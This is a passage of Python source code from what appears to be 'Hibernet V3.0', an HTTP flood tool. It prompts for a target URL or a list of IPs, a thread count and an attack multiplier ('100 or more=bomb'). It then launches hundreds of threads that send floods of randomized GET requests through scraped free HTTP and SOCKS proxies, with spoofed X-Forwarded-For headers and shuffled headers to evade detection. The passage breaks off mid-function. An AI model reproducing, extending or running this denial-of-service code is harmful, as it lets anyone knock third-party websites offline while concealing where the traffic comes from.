            working_proxies = sum(1 for p in self.proxies.values() if p.is_working)

            if total_proxies == 0:
                return {'total': 0, 'working': 0, 'success_rate': 0.0}

            total_success = sum(p.success_count for p in self.proxies.values())
            total_requests = sum(p.success_count + p.failure_count for p in self.proxies.values())
            overall_success_rate = total_success / total_requests if total_requests > 0 else 0.0

            # Geographic distribution
            countries = {}
            for proxy in self.proxies.values():
                if proxy.country:
                    countries[proxy.country] = countries.get(proxy.country, 0) + 1

            # Top performing proxies
            top_proxies = sorted(
                self.proxies.values(),
                key=lambda p: p.health_score,
                reverse=True
            )[:5]

            return {
                'total': total_proxies,
                'working': working_proxies,
                'success_rate': overall_success_rate,
                'countries': countries,
                'rotation_strategy': self.rotation_strategy.value,
                'top_proxies': [
                    {
                        'id': f"{p.host}:{p.port}",
                        'health_score': p.health_score,
                        'success_rate': p.success_rate,
                        'avg_response_time': p.average_response_time,
                        'country': p.country
                    }
                    for p in top_proxies
                ]
            }

    def save_proxy_stats(self, filename: str):
        """Save proxy statistics to file"""
        with self.lock:
            stats = {
                'proxies': {pid: proxy.to_dict() for pid, proxy in self.proxies.items()},
                'performance_history': list(self.performance_history),
                'rotation_strategy': self.rotation_strategy.value,
                'timestamp': datetime.now().isoformat()
            }

            try:
                with open(filename, 'w') as f:
                    json.dump(stats, f, indent=2, default=str)
                http2_logger.info(f"Saved proxy statistics to {filename}")
            except Exception as e:
                http2_logger.error(f"Failed to save proxy statistics: {e}")

    def set_rotation_strategy(self, strategy: ProxyRotationStrategy):
        """Set proxy rotation strategy"""
        with self.lock:
            self.rotation_strategy = strategy
            http2_logger.info(f"Proxy rotation strategy set to: {strategy.value}")

# Global advanced proxy manager
advanced_proxy_manager = AdvancedProxyManager()

# Legacy compatibility functions
proxy_stats = {}
proxy_lock = threading.Lock()

# Comprehensive Real-time Metrics and Reporting System
import csv
from datetime import datetime
from collections import Counter
import threading
import time

@dataclass
class RequestMetrics:
    """Individual request metrics"""
    timestamp: datetime
    thread_id: int
    target_host: str
    target_port: int
    proxy_used: Optional[str]
    protocol: str  # 'HTTP/1.1', 'HTTP/2', 'HTTP/3', 'WebSocket'
    method: str
    status_code: Optional[int]
    response_time: float
    bytes_sent: int
    bytes_received: int
    success: bool
    error_message: Optional[str] = None

@dataclass
class TestSession:
    """Test session information"""
    session_id: str
    start_time: datetime
    end_time: Optional[datetime]
    target_urls: List[str]
    total_threads: int
    duration_seconds: float
    test_type: str  # 'http_flood', 'websocket_stress', etc.
    configuration: Dict[str, Any]

class MetricsCollector:
    """Real-time metrics collection and analysis"""

    def __init__(self):
        self.metrics: List[RequestMetrics] = []
        self.sessions: List[TestSession] = []
        self.current_session: Optional[TestSession] = None
        self.lock = threading.RLock()
        self.start_time = time.time()

        # Real-time counters
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.total_bytes_sent = 0
        self.total_bytes_received = 0
        self.response_times = deque(maxlen=1000)  # Keep last 1000 response times

        # Error tracking
        self.error_counts = Counter()
        self.status_code_counts = Counter()
        self.protocol_counts = Counter()

        # Performance tracking
        self.requests_per_second_history = deque(maxlen=300)  # 5 minutes at 1-second intervals
        self.last_rps_calculation = time.time()
        self.last_request_count = 0

        # Start background metrics updater
        self.metrics_thread = threading.Thread(target=self._update_metrics_loop, daemon=True)
        self.metrics_thread.start()

    def start_session(self, session_id: str, target_urls: List[str], total_threads: int,
                     duration_seconds: float, test_type: str, configuration: Dict[str, Any]):
        """Start a new test session"""
        with self.lock:
            self.current_session = TestSession(
                session_id=session_id,
                start_time=datetime.now(),
                end_time=None,
                target_urls=target_urls,
                total_threads=total_threads,
                duration_seconds=duration_seconds,
                test_type=test_type,
                configuration=configuration
            )
            self.sessions.append(self.current_session)

            # Reset counters for new session
            self.total_requests = 0
            self.successful_requests = 0
            self.failed_requests = 0
            self.total_bytes_sent = 0
            self.total_bytes_received = 0
            self.response_times.clear()
            self.error_counts.clear()
            self.status_code_counts.clear()
            self.protocol_counts.clear()

            http2_logger.info(f"Started test session: {session_id}")

    def end_session(self):
        """End the current test session"""
        with self.lock:
            if self.current_session:
                self.current_session.end_time = datetime.now()
                http2_logger.info(f"Ended test session: {self.current_session.session_id}")

    def record_request(self, thread_id: int, target_host: str, target_port: int,
                      proxy_used: Optional[str], protocol: str, method: str,
                      status_code: Optional[int], response_time: float,
                      bytes_sent: int, bytes_received: int, success: bool,
                      error_message: Optional[str] = None):
        """Record a request metric"""
        with self.lock:
            metric = RequestMetrics(
                timestamp=datetime.now(),
                thread_id=thread_id,
                target_host=target_host,
                target_port=target_port,
                proxy_used=proxy_used,
                protocol=protocol,
                method=method,
                status_code=status_code,
                response_time=response_time,
                bytes_sent=bytes_sent,
                bytes_received=bytes_received,
                success=success,
                error_message=error_message
            )

            self.metrics.append(metric)

            # Update counters
            self.total_requests += 1
            if success:
                self.successful_requests += 1
            else:
                self.failed_requests += 1
                if error_message:
                    self.error_counts[error_message] += 1

            self.total_bytes_sent += bytes_sent
            self.total_bytes_received += bytes_received
            self.response_times.append(response_time)

            if status_code:
                self.status_code_counts[status_code] += 1

            self.protocol_counts[protocol] += 1

    def _update_metrics_loop(self):
        """Background thread to update real-time metrics"""
        while True:
            try:
                current_time = time.time()

                # Calculate requests per second
                if current_time - self.last_rps_calculation >= 1.0:
                    current_requests = self.total_requests
                    rps = current_requests - self.last_request_count

                    with self.lock:
                        self.requests_per_second_history.append(rps)

                    self.last_request_count = current_requests
                    self.last_rps_calculation = current_time

                time.sleep(1.0)

            except Exception as e:
                http2_logger.error(f"Error in metrics update loop: {e}")
                time.sleep(5.0)

    def get_real_time_stats(self) -> Dict[str, Any]:
        """Get current real-time statistics"""
        with self.lock:
            current_time = time.time()
            elapsed_time = current_time - self.start_time

            # Calculate rates
            rps = self.total_requests / elapsed_time if elapsed_time > 0 else 0
            success_rate = self.successful_requests / self.total_requests if self.total_requests > 0 else 0

            # Calculate response time statistics
            if self.response_times:
                avg_response_time = sum(self.response_times) / len(self.response_times)
                min_response_time = min(self.response_times)
                max_response_time = max(self.response_times)

                # Calculate percentiles
                sorted_times = sorted(self.response_times)
                p50 = sorted_times[len(sorted_times) // 2]
                p95 = sorted_times[int(len(sorted_times) * 0.95)]
                p99 = sorted_times[int(len(sorted_times) * 0.99)]
            else:
                avg_response_time = min_response_time = max_response_time = 0
                p50 = p95 = p99 = 0

            # Current RPS (last 10 seconds average)
            recent_rps = list(self.requests_per_second_history)[-10:]
            current_rps = sum(recent_rps) / len(recent_rps) if recent_rps else 0

            return {
                'session': {
                    'id': self.current_session.session_id if self.current_session else None,
                    'elapsed_time': elapsed_time,
                    'is_active': self.current_session and not self.current_session.end_time
                },
                'requests': {
                    'total': self.total_requests,
                    'successful': self.successful_requests,
                    'failed': self.failed_requests,
                    'success_rate': success_rate,
                    'requests_per_second': rps,
                    'current_rps': current_rps
                },
                'response_times': {
                    'average': avg_response_time,
                    'minimum': min_response_time,
                    'maximum': max_response_time,
                    'p50': p50,
                    'p95': p95,
                    'p99': p99
                },
                'bandwidth': {
                    'bytes_sent': self.total_bytes_sent,
                    'bytes_received': self.total_bytes_received,
                    'total_bytes': self.total_bytes_sent + self.total_bytes_received
                },
                'protocols': dict(self.protocol_counts),
                'status_codes': dict(self.status_code_counts),
                'top_errors': dict(self.error_counts.most_common(5))
            }

    def print_real_time_stats(self):
        """Print formatted real-time statistics"""
        stats = self.get_real_time_stats()

        print("\n" + "="*80)
        print("HIBERNET V3.0 - REAL-TIME STATISTICS")
        print("="*80)

        # Session info
        session = stats['session']
        if session['id']:
            print(f"Session: {session['id']} | Elapsed: {session['elapsed_time']:.1f}s | Active: {session['is_active']}")

        # Request statistics
        req = stats['requests']
        print(f"\nREQUESTS:")
        print(f"  Total: {req['total']:,} | Success: {req['successful']:,} | Failed: {req['failed']:,}")
        print(f"  Success Rate: {req['success_rate']:.2%} | RPS: {req['requests_per_second']:.1f} | Current RPS: {req['current_rps']:.1f}")

        # Response time statistics
        rt = stats['response_times']
        print(f"\nRESPONSE TIMES (ms):")
        print(f"  Avg: {rt['average']*1000:.1f} | Min: {rt['minimum']*1000:.1f} | Max: {rt['maximum']*1000:.1f}")
        print(f"  P50: {rt['p50']*1000:.1f} | P95: {rt['p95']*1000:.1f} | P99: {rt['p99']*1000:.1f}")

        # Bandwidth
        bw = stats['bandwidth']
        print(f"\nBANDWIDTH:")
        print(f"  Sent: {bw['bytes_sent']:,} bytes | Received: {bw['bytes_received']:,} bytes")
        print(f"  Total: {bw['total_bytes']:,} bytes")

        # Protocols
        if stats['protocols']:
            print(f"\nPROTOCOLS:")
            for protocol, count in stats['protocols'].items():
                print(f"  {protocol}: {count:,}")

        # Status codes
        if stats['status_codes']:
            print(f"\nSTATUS CODES:")
            for code, count in sorted(stats['status_codes'].items()):
                print(f"  {code}: {count:,}")

        # Top errors
        if stats['top_errors']:
            print(f"\nTOP ERRORS:")
            for error, count in stats['top_errors'].items():
                print(f"  {error}: {count:,}")

        print("="*80)

    def export_metrics_csv(self, filename: str):
        """Export metrics to CSV file"""
        with self.lock:
            try:
                with open(filename, 'w', newline='') as csvfile:
                    fieldnames = [
                        'timestamp', 'thread_id', 'target_host', 'target_port',
                        'proxy_used', 'protocol', 'method', 'status_code',
                        'response_time', 'bytes_sent', 'bytes_received',
                        'success', 'error_message'
                    ]

                    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
                    writer.writeheader()

                    for metric in self.metrics:
                        writer.writerow({
                            'timestamp': metric.timestamp.isoformat(),
                            'thread_id': metric.thread_id,
                            'target_host': metric.target_host,
                            'target_port': metric.target_port,
                            'proxy_used': metric.proxy_used,
                            'protocol': metric.protocol,
                            'method': metric.method,
                            'status_code': metric.status_code,
                            'response_time': metric.response_time,
                            'bytes_sent': metric.bytes_sent,
                            'bytes_received': metric.bytes_received,
                            'success': metric.success,
                            'error_message': metric.error_message
                        })

                http2_logger.info(f"Exported {len(self.metrics)} metrics to {filename}")

            except Exception as e:
                http2_logger.error(f"Failed to export metrics to CSV: {e}")

    def export_report_json(self, filename: str):
        """Export comprehensive report to JSON"""
        with self.lock:
            try:
                report = {
                    'summary': self.get_real_time_stats(),
                    'sessions': [
                        {
                            'session_id': s.session_id,
                            'start_time': s.start_time.isoformat(),
                            'end_time': s.end_time.isoformat() if s.end_time else None,
                            'target_urls': s.target_urls,
                            'total_threads': s.total_threads,
                            'duration_seconds': s.duration_seconds,
                            'test_type': s.test_type,
                            'configuration': s.configuration
                        }
                        for s in self.sessions
                    ],
                    'proxy_stats': advanced_proxy_manager.get_proxy_stats(),
                    'export_timestamp': datetime.now().isoformat()
                }

                with open(filename, 'w') as f:
                    json.dump(report, f, indent=2, default=str)

                http2_logger.info(f"Exported comprehensive report to {filename}")

            except Exception as e:
                http2_logger.error(f"Failed to export JSON report: {e}")

# Global metrics collector
metrics_collector = MetricsCollector()

# Enhanced logging function to replace print statements
def log_request(thread_id: int, message: str, target_host: str = "", target_port: int = 80,
               proxy_used: str = None, protocol: str = "HTTP/1.1", success: bool = True,
               response_time: float = 0.0, status_code: int = None, error_message: str = None):
    """Enhanced logging function with metrics collection"""

    # Record metrics
    metrics_collector.record_request(
        thread_id=thread_id,
        target_host=target_host,
        target_port=target_port,
        proxy_used=proxy_used,
        protocol=protocol,
        method="GET",
        status_code=status_code,
        response_time=response_time,
        bytes_sent=len(message.encode()) if message else 0,
        bytes_received=0,  # We don't track response size in current implementation
        success=success,
        error_message=error_message
    )

    # Print message (can be disabled for performance)
    if success:
        print(f"✓ {message}")
    else:
        print(f"✗ {message} - Error: {error_message}")

# Real-time dashboard thread
def start_real_time_dashboard(update_interval: float = 5.0):
    """Start real-time dashboard in separate thread"""
    def dashboard_loop():
        while True:
            try:
                time.sleep(update_interval)
                metrics_collector.print_real_time_stats()
            except KeyboardInterrupt:
                break
            except Exception as e:
                http2_logger.error(f"Dashboard error: {e}")
                time.sleep(10)

    dashboard_thread = threading.Thread(target=dashboard_loop, daemon=True)
    dashboard_thread.start()
    return dashboard_thread

def check_proxy_health(proxy_host, proxy_port, proxy_type="http"):
	"""Check if a proxy is working by making a simple HTTP request"""
	try:
		if proxy_type == "socks":
			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_host, int(proxy_port), True)
			s = socks.socksocket()
			s.settimeout(10)
			s.connect(("httpbin.org", 80))
			s.close()
		else:
			# For HTTP proxies, we'll do a simple socket connection test
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(10)
			s.connect((proxy_host, int(proxy_port)))
			s.close()
		return True
	except:
		return False

def update_proxy_stats(proxy, success=True):
	"""Update proxy statistics for health tracking"""
	with proxy_lock:
		if proxy not in proxy_stats:
			proxy_stats[proxy] = {"success": 0, "failure": 0, "last_check": 0}
		
		if success:
			proxy_stats[proxy]["success"] += 1
		else:
			proxy_stats[proxy]["failure"] += 1
		
		proxy_stats[proxy]["last_check"] = time.time()

def get_proxy_health(proxy):
	"""Get proxy health score (0-1, where 1 is perfect health)"""
	with proxy_lock:
		if proxy not in proxy_stats:
			return 1.0  # Unknown proxies are assumed healthy initially
		
		stats = proxy_stats[proxy]
		total = stats["success"] + stats["failure"]
		if total == 0:
			return 1.0
		
		return stats["success"] / total

def is_proxy_healthy(proxy, health_threshold=0.5):
	"""Check if proxy is healthy based on success rate"""
	health = get_proxy_health(proxy)
	return health >= health_threshold


def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
	global url
	global url2
	global urlport
	global choice1
	global ips

	choice1 = input("\nDo you want one target [0] or more[1] > ")

	if choice1 == "1":
		ip_file = input("Insert txt file of ips > ")
		ips = open(ip_file).readlines()



	else:
		url = input("\nInsert URL/IP: ").strip()

		if url == "":
			print ("Please enter the url.")
			starturl()

		try:
			if url[0]+url[1]+url[2]+url[3] == "www.":
				url = "http://" + url
			elif url[0]+url[1]+url[2]+url[3] == "http":
				pass
			else:
				url = "http://" + url
		except:
			print("You mistyped, try again.")
			starturl()

		try:
			url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
		except:
			url2 = url.replace("http://", "").replace("https://", "").split("/")[0]

		try:
			urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
		except:
			urlport = "80"

	proxymode()


def proxymode():
	global choice2
	choice2 = input("Do you want proxy/socks mode? Answer 'y' to enable it: ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()

def choiceproxysocks():
	global choice3
	choice3 = input("Type '0' to enable proxymode or type '1' to enable socksmode: ")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
	else:
		print ("You mistyped, try again.")
		choiceproxysocks()

def choicedownproxy():
	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
	if choice4 == "y":
		urlproxy = "http://free-proxy-list.net/"
		proxyget(urlproxy)
	else:
		proxylist()

def choicedownsocks():
	choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
	if choice4 == "y":
		urlproxy = "https://www.socks-proxy.net/"
		proxyget(urlproxy)
	else:
		proxylist()

def proxyget(urlproxy): # lo dice il nome, questa funzione scarica i proxies
	try:
		req = urllib.request.Request(("%s") % (urlproxy))       # qua impostiamo il sito da dove scaricare.
		req.add_header("User-Agent", random.choice(useragents)) # siccome il format del sito e' identico sia
		sourcecode = urllib.request.urlopen(req)                # per free-proxy-list.net che per socks-proxy.net,
		part = str(sourcecode.read())                           # imposto la variabile urlproxy in base a cosa si sceglie.
		part = part.split("<tbody>")
		part = part[1].split("</tbody>")
		part = part[0].split("<tr><td>")
		proxies = ""
		for proxy in part:
			proxy = proxy.split("</td><td>")
			try:
				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
			except:
				pass
		out_file = open("proxy.txt","w")
		out_file.write("")
		out_file.write(proxies)
		out_file.close()
		print ("Proxies downloaded successfully.")
	except: # se succede qualche casino
		print ("\nERROR!\n")
	proxylist() # se va tutto liscio allora prosegue eseguendo la funzione proxylist()

def proxylist():
	global proxies
	out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
	proxies = open(out_file).readlines()
	numthreads()

def numthreads():
	global threads
	try:
		threads = int(input("Insert number of threads (800): "))
	except ValueError:
		threads = 800
		print ("800 threads selected.\n")
	multiplication()

def multiplication():
	global multiple
	try:
		multiple = int(input("Insert a number of multiplication for the attack [(1-5=normal)(50=powerful)(100 or more=bomb)]: "))
	except ValueError:
		print("You mistyped, try again.\n")
		multiplication()
	begin()

def begin():
	choice6 = input("Press 'Enter' to start attack: ")
	if choice6 == "":
		loop()
	elif choice6 == "Enter": #lool
		loop()
	elif choice6 == "enter": #loool
		loop()
	else:
		exit(0)

def loop():
	global threads
	global acceptall
	global additional_headers
	global connection
	global go
	global x
	
	acceptall = [
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept-Encoding: gzip, deflate\r\n",
	"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
	"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
	"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,",
	"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept: text/html, application/xhtml+xml",
	"Accept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
	"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	] # header accept a caso per far sembrare le richieste più legittime
	
	# Additional headers for more sophisticated randomization
	additional_headers = [
		"Cache-Control: no-cache\r\n",
		"Cache-Control: max-age=0\r\n",
		"Cache-Control: no-cache, no-store, must-revalidate\r\n",
		"Pragma: no-cache\r\n",
		"Expires: 0\r\n",
		"Expires: -1\r\n",
		"Referer: https://www.google.com/\r\n",
		"Referer: https://www.bing.com/\r\n",
		"Referer: https://www.yahoo.com/\r\n",
		"Upgrade-Insecure-Requests: 1\r\n",
		"DNT: 1\r\n",
		"Accept-CH: DPR, Width, Viewport-Width\r\n",
		"Accept-CH-Lifetime: 86400\r\n",
		"Early-Data: 1\r\n",
		"Save-Data: on\r\n",
		"Viewport-Width: 1920\r\n",
		"Width: 1920\r\n",
	]
	
	# Thread management enhancements
	connection = "Connection: Keep-Alive\r\n" # la keep alive torna sempre utile lol
	x = 0 # thanks therunixx, my friend
	go = threading.Event()
	
	# Performance optimization: limit the number of concurrent threads
	# to prevent overwhelming the system
	max_concurrent_threads = min(threads, 1000)  # Limit to 1000 concurrent threads
	
	if choice2 == "y": # se abbiamo scelto la modalita' proxying
		if choice3 == "0": # e abbiamo scelto gli HTTP proxy
			thread_list = []
			for x in range(threads):
				thread = RequestProxyHTTP(x+1)
				thread_list.append(thread)
				thread.start() # starta la classe apposita
				print ("Thread " + str(x) + " ready!")
				# Throttle thread creation to prevent overwhelming the system
				if (x+1) % max_concurrent_threads == 0:
					# Wait for all current threads to be ready before creating more
					for t in thread_list:
						t.join(0.1)  # Non-blocking join
					thread_list = []
		else: # se abbiamo scelto i socks
			thread_list = []
			for x in range(threads):
				thread = RequestSocksHTTP(x+1)
				thread_list.append(thread)
				thread.start() # starta la classe apposita
				print ("Thread " + str(x) + " ready!")
				# Throttle thread creation to prevent overwhelming the system
				if (x+1) % max_concurrent_threads == 0:
					# Wait for all current threads to be ready before creating more
					for t in thread_list:
						t.join(0.1)  # Non-blocking join
					thread_list = []
	else: # altrimenti manda richieste normali non proxate.
		thread_list = []
		for x in range(threads):
			thread = RequestDefaultHTTP(x+1)
			thread_list.append(thread)
			thread.start() # starta la classe apposita
			print ("Thread " + str(x) + " ready!")
			# Throttle thread creation to prevent overwhelming the system
			if (x+1) % max_concurrent_threads == 0:
				# Wait for all current threads to be ready before creating more
				for t in thread_list:
					t.join(0.1)  # Non-blocking join
				thread_list = []
	
	# Enhanced error handling and reporting
	try:
		go.set() # questo fa avviare i threads appena sono tutti pronti
		print("All threads started successfully!")
	except Exception as e:
		print(f"Error starting threads: {e}")


class RequestProxyHTTP(threading.Thread): # Enhanced HTTP proxy class with connection pooling

	def __init__(self, counter):
		threading.Thread.__init__(self)
		self.counter = counter
		self.connection_pool = http1_pool  # Use global connection pool
		self.current_connection = None
		self.connection_reuse_count = 0
		self.max_reuse_count = 10  # Reuse connection up to 10 times

	def get_healthy_proxy(self, current_proxy=None):
		"""Get a healthy proxy, excluding the current one if specified"""
		# First try to get a healthy proxy from the list
		healthy_proxies = []
		for i, p in enumerate(proxies):
			proxy_parts = p.strip().split(':')
			if len(proxy_parts) >= 2:
				proxy_addr = proxy_parts[0] + ":" + proxy_parts[1]
				if is_proxy_healthy(proxy_addr):
					healthy_proxies.append((i, proxy_parts))

		# If we have healthy proxies, choose one randomly (but not the current one if specified)
		if healthy_proxies:
			if current_proxy and len(healthy_proxies) > 1:
				# Filter out the current proxy
				filtered = [p for p in healthy_proxies if p[1][0] != current_proxy[0] or p[1][1] != current_proxy[1]]
				if filtered:
					return random.choice(filtered)[1]
			return random.choice(healthy_proxies)[1]

		# If no healthy proxies, try any proxy
		if x < len(proxies):
			return proxies[x].strip().split(':')
		else:
			return random.choice(proxies).strip().split(":")

	def get_connection(self, proxy, target_host, target_port, use_ssl=False):
		"""Get a connection from pool or create new one"""
		# Try to get from pool first
		conn = self.connection_pool.get_connection(
			target_host, target_port, use_ssl, proxy
		)

		if conn:
			return conn

		# Create new connection if pool is empty
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.settimeout(10)
			sock.connect((str(proxy[0]), int(proxy[1])))

			# For HTTPS through HTTP proxy, establish CONNECT tunnel
			if use_ssl:
				connect_request = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n\r\n"
				sock.send(connect_request.encode())

				# Read CONNECT response
				response = sock.recv(1024).decode()
				if "200" not in response:
					sock.close()
					return None

				# Wrap with SSL
				context = ssl.create_default_context()
				context.check_hostname = False
				context.verify_mode = ssl.CERT_NONE
				sock = context.wrap_socket(sock, server_hostname=target_host)

			return sock

		except Exception as e:
			http2_logger.error(f"Failed to create proxy connection: {e}")
			return None

	def return_connection(self, sock, proxy, target_host, target_port, use_ssl=False):
		"""Return connection to pool if still usable"""
		if sock and self.connection_reuse_count < self.max_reuse_count:
			self.connection_pool.return_connection(
				sock, target_host, target_port, use_ssl, proxy
			)
		elif sock:
			try:
				sock.close()
			except:
				pass

	def run(self): # Enhanced run method with connection pooling and better HTTP/1.1 support
		# Determine target details
		if choice1 == "1":
			target_url = random.choice(ips).strip()
			if target_url.startswith("http://"):
				target_host = target_url.replace("http://", "").split("/")[0].split(":")[0]
				target_port = 80
				use_ssl = False
			elif target_url.startswith("https://"):
				target_host = target_url.replace("https://", "").split("/")[0].split(":")[0]
				target_port = 443
				use_ssl = True
			else:
				target_host = target_url.split(":")[0]
				target_port = int(target_url.split(":")[1]) if ":" in target_url else 80
				use_ssl = False
			path = "/" + "/".join(target_url.split("/")[1:]) if "/" in target_url else "/"
		else:
			target_host = url2
			target_port = int(urlport)
			use_ssl = url.startswith("https://")
			path = "/" + "/".join(url.split("/")[3:]) if len(url.split("/")) > 3 else "/"

		# Generate realistic headers
		randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))

		# Build HTTP/1.1 request with proper formatting
		request_line = f"GET {path} HTTP/1.1\r\n"

		# Essential headers
		headers = [
			f"Host: {target_host}\r\n",
			f"User-Agent: {random.choice(useragents)}\r\n",
			random.choice(acceptall),
			f"X-Forwarded-For: {randomip}\r\n",
			"Connection: keep-alive\r\n",  # Use keep-alive for connection reuse
		]

		# Add additional headers randomly for realism
		for _ in range(random.randint(1, 4)):
			headers.append(random.choice(additional_headers))

		# Shuffle headers for variation
		random.shuffle(headers)

		# Build complete request
		request = request_line + "".join(headers) + "\r\n"

		proxy = self.get_healthy_proxy() # get a healthy proxy
		
		# Error recovery counters
		consecutive_failures = 0
		max_consecutive_failures = 10

		# Try HTTP/2 first if available
		if HTTP2_AVAILABLE:
			try:
				# For HTTP/2 through proxy, establish CONNECT tunnel first
				sock, conn = create_http2_connection(target_host, target_port, use_ssl)
				if sock and conn:
					# Convert headers to HTTP/2 format
					h2_headers = [
						(':method', 'GET'),
						(':path', path),
						(':scheme', 'https' if use_ssl else 'http'),
						(':authority', f"{target_host}:{target_port}"),
						('user-agent', random.choice(useragents)),
						('x-forwarded-for', randomip),
					]

					# Send HTTP/2 request
					if send_http2_request(sock, conn, h2_headers):
						print(f"HTTP/2 Request sent from {proxy[0]}:{proxy[1]} @{self.counter}")
						update_proxy_stats(proxy[0] + ":" + proxy[1], True)
						consecutive_failures = 0
						go.wait()
						return  # If HTTP/2 works, we're done
					else:
						try:
							sock.close()
						except:
							pass
			except Exception as e:
				http2_logger.debug(f"HTTP/2 connection failed for proxy {proxy[0]}:{proxy[1]}: {e}")

		# Enhanced HTTP/1.1 with connection pooling
		go.wait() # Wait for all threads to be ready

		while True:
			connection_from_pool = False
			s = None

			try:
				# Try to get connection from pool first
				s = self.get_connection(proxy, target_host, target_port, use_ssl)
				if s:
					connection_from_pool = True
					self.connection_reuse_count += 1
				else:
					# Create new connection if pool failed
					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					s.settimeout(10)
					s.connect((str(proxy[0]), int(proxy[1])))
					self.connection_reuse_count = 0

				# Send the request
				s.send(str.encode(request))
				print(f"Request sent from {proxy[0]}:{proxy[1]} @{self.counter}")
				update_proxy_stats(proxy[0] + ":" + proxy[1], True)
				consecutive_failures = 0

				# Send multiple requests on same connection (HTTP/1.1 pipelining simulation)
				try:
					for _ in range(multiple):
						s.send(str.encode(request))
						time.sleep(0.01)  # Small delay to prevent overwhelming
				except Exception as send_error:
					http2_logger.debug(f"Error sending multiple requests: {send_error}")

				# Return connection to pool if it's still good and not overused
				if connection_from_pool and self.connection_reuse_count < self.max_reuse_count:
					self.return_connection(s, proxy, target_host, target_port, use_ssl)
					s = None  # Don't close it in finally block

				# Cleanup expired connections periodically
				if random.randint(1, 100) == 1:  # 1% chance
					self.connection_pool.cleanup_expired()

			except Exception as e:
				# Update proxy stats on failure
				update_proxy_stats(proxy[0] + ":" + proxy[1], False)
				consecutive_failures += 1

				# Close failed connection
				if s:
					try:
						s.close()
					except:
						pass

				# If too many consecutive failures, exit thread
				if consecutive_failures >= max_consecutive_failures:
					print(f"Thread {self.counter} exiting due to too many consecutive failures")
					break

				# Try with a different proxy
				proxy = self.get_healthy_proxy(proxy)
				continue

class RequestSocksHTTP(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def get_healthy_proxy(self, current_proxy=None):
		"""Get a healthy proxy, excluding the current one if specified"""
		# First try to get a healthy proxy from the list
		healthy_proxies = []
		for i, p in enumerate(proxies):
			proxy_parts = p.strip().split(':')
			if len(proxy_parts) >= 2:
				proxy_addr = proxy_parts[0] + ":" + proxy_parts[1]
				if is_proxy_healthy(proxy_addr):
					healthy_proxies.append((i, proxy_parts))
		
		# If we have healthy proxies, choose one randomly (but not the current one if specified)
		if healthy_proxies:
			if current_proxy and len(healthy_proxies) > 1:
				# Filter out the current proxy
				filtered = [p for p in healthy_proxies if p[1][0] != current_proxy[0] or p[1][1] != current_proxy[1]]
				if filtered:
					return random.choice(filtered)[1]
			return random.choice(healthy_proxies)[1]
		
		# If no healthy proxies, try any proxy
		if x < len(proxies):
			return proxies[x].strip().split(':')
		else:
			return random.choice(proxies).strip().split(":")

	def run(self): # la funzione che da' le istruzioni ai vari threads
		if choice1 == "1":
			ip = random.choice(ips)
			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
		else:
			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
		
		# Create a list of all possible headers
		all_headers = []
